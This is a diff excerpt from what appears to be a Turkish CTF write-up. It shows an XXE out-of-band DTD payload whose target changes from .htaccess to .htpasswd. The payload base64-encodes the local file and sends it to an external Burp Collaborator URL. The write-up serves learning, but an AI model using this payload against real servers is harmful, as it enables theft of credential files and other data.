@@ -92,7 +92,7 @@ Burada bize flag'in `C:\Windows` dizininde olduğunu ve flagin isminin `flag_\d{
 
 **ex.dtd dosyasının içeriğini aşağıdaki gibi değiştirdim .htaccess'i okuyabilmek için:**
 ```
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=C:/xampp/htdocs/.htaccess">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=C:/xampp/htdocs/.htpasswd">
 <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://qmgtfsyjox8fdh4q8ug2io8kvb12pr.burpcollaborator.net/?%data;'>">
 ``` 
 
